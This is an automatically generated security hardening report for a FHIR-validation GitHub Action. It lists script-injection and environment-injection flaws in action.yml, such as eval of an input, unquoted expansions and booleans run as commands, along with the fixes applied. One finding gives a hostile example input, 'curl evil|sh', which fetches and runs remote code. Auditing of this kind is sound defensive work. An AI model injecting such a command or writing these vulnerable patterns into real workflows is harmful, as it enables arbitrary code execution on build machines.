<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.9.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.9.2** was hardened automatically. 11 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): in the 'Download Java Validator' step, the input JAVA_VALIDATOR_DOWNLOAD_LOCATION is evaluated: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. eval runs any `$(...)`, backticks or `;` in the input, so this is arbitrary command execution. The value is then expanded unquoted in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`. Fix: drop eval, replace only the literal `$JAVA_VALIDATOR_VERSION` placeholder with bash string substitution, and quote the URL.

Locations:

- `action.yml:697`
- `action.yml:700`

### script-injection (severity: high)

Rule (b): most steps test boolean inputs by running them as commands without quotes, e.g. `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then`. The input's value runs as a command, so a value like `curl evil|sh` executes. Affected steps include: Check if .NET is installed, Check .NET SDK Version, Install Firely.Terminal, Check Firely Terminal Version, Simplifier login, Detect FHIR version, Validate FHIR version support, Set FHIR specification, Check if npm is installed, Check npm Version, Install fsh-sushi, Check SUSHI version, Generate conformance resources with SUSHI, Pre-processing, Configure validator engine, Run Quality Control checks, Report Success, Remove package cache, Check if Java is installed, Download Java Validator, Validate conformance/example resources, and Re-run SUSHI. Fix: compare quoted strings instead, e.g. `if [[ "$INPUT_DOTNET_VALIDATION_ENABLED" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:183`
- `action.yml:202`
- `action.yml:285`
- `action.yml:363`
- `action.yml:501`
- `action.yml:514`
- `action.yml:524`
- `action.yml:535`
- `action.yml:544`
- `action.yml:558`
- `action.yml:613`
- `action.yml:637`
- `action.yml:653`
- `action.yml:670`
- `action.yml:680`
- `action.yml:693`
- `action.yml:718`
- `action.yml:792`
- `action.yml:855`

### script-injection (severity: high)

Rule (b): in the 'Install Firely.Terminal' step, an input is expanded without quotes: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION`.

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b): in the 'Simplifier login' step, credential inputs are expanded without quotes: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b): in the 'Install fsh-sushi' step, an input is expanded without quotes: `sudo npm install -g fsh-sushi@$SUSHI_VERSION`.

Locations:

- `action.yml:526`

### script-injection (severity: high)

Rule (b): in the 'Generate conformance resources with SUSHI' step, an input is expanded without quotes: `sushi $INPUT_SUSHI_OPTIONS`.

Locations:

- `action.yml:545`

### script-injection (severity: high)

Rule (b): in the 'Run Quality Control checks' step, inputs are expanded without quotes: `if echo $INPUT_EXPECTED_FAILS | grep ...`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES`, and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`.

Locations:

- `action.yml:639`
- `action.yml:640`
- `action.yml:642`

### script-injection (severity: high)

Rule (b): in the 'Validate all conformance resources in scope of the repository' step, workflow-controlled values are expanded without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS ...`.

Locations:

- `action.yml:741`
- `action.yml:746`
- `action.yml:756`
- `action.yml:757`
- `action.yml:759`

### script-injection (severity: high)

Rule (b): in the 'Validate all example resources in scope of the repository' step, workflow-controlled values are expanded without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS ...`.

Locations:

- `action.yml:809`
- `action.yml:814`
- `action.yml:824`
- `action.yml:825`
- `action.yml:827`

### script-injection (severity: high)

Rule (b): in the 'Re-run SUSHI to restore conformance resources after slicing modification' step, inputs are expanded without quotes: `if $CLOSE_SLICING_FOR_VALIDATION && $INPUT_SUSHI_ENABLED; then` and `sushi $INPUT_SUSHI_OPTIONS`.

Locations:

- `action.yml:855`
- `action.yml:857`

### github-env-injection (severity: high)

In the 'Detect FHIR version and determine dependency source' step, `echo "FHIR_VERSION=$fhirVersion" >> "$GITHUB_ENV"` writes a value read from repo files (package.json via jq, or sushi-config.yaml via yq or base64 -d). Those files can be changed in a pull request. The value is not passed through `printf '%s' ... | tr -d '\n\r'` first, so a value containing a newline could add extra environment variables. The other GITHUB_ENV writes in this step are literal true/false values and are fine.

Locations:

- `action.yml:271`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

- Boolean inputs are no longer run as commands. They are now compared as quoted strings, e.g. `[[ "$X" == "true" ]]`, in every affected step. This includes the SUSHI_USE_CONFIG_DEPENDENCIES, CLOSE_SLICING and JAVA_SNAPSHOT checks.
- In 'Download Java Validator', I removed the `eval`. Bash string substitution now replaces only the literal `$JAVA_VALIDATOR_VERSION` and `${JAVA_VALIDATOR_VERSION}` placeholders, with the replacement quoted. The URL passed to wget is quoted.
- These single values are now quoted: FIRELY_TERMINAL_VERSION, the Simplifier login email and password, `fsh-sushi@$SUSHI_VERSION`, `$USER`, `$fhirCacheLocation` and FHIR_VERSION. The optional quality-control rules path uses `${VAR:+"$VAR"}` so it drops out when empty.
- EXPECTED_FAILS is now checked with `printf '%s\n' "$VAR" | grep -w`.
- Some inputs are lists that upstream left unquoted so the shell would split them and expand globs: SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES and the IG dependencies read from package.json. Each is now loaded into a bash array with an unquoted assignment, which splits and globs exactly as upstream did, and expanded as "${arr[@]}".
- The local -ig parameters are now built as an array of separate arguments. One change from upstream: a workspace path containing spaces now stays one argument instead of being split.
- The file globs became "$GITHUB_WORKSPACE/$p"*.xml and *.json, so the `*` still matches files.
- FHIR_VERSION is passed through `printf '%s' | tr -d '\n\r'` before it is written to GITHUB_ENV.

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Changed all nine '# shellcheck disable=SC2206' markers to '# shellcheck disable=SC2086' above the intentional unquoted array assignments (sushi_args, conformancePaths, javaOptions, examplePaths, igDependencies). I kept the unquoted array form (args=($VAR)) on purpose: it splits on whitespace and expands globs exactly as upstream's unquoted variables did, and nothing inside the value gets run. Nothing was run or tested; I only checked by searching the file that each of the nine assignments now has the marker on the line above it.

